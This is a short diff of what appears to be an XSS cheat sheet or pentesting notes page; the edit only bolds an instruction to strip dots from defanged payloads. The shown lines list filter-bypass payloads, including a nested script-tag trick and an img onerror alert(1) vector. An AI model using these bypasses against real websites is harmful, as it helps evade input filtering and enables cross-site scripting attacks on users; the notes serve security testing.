@@ -23,7 +23,7 @@ is it being blocked due to the spaces? remove all spaces from the attack payload
 <br>
 <br>
 <h2>XSS Filter Bypasses</h2> <br>
-Remove . from all payloads
+**Remove . from all payloads** <br>
 <code>Is <.script>alert(1)</script.> filtered? Try: <br>
 <scr<.script>ipt>alert(1)</scr</script.>ipt> <br>
 <.img src=x onerror=alert(1)> <br>
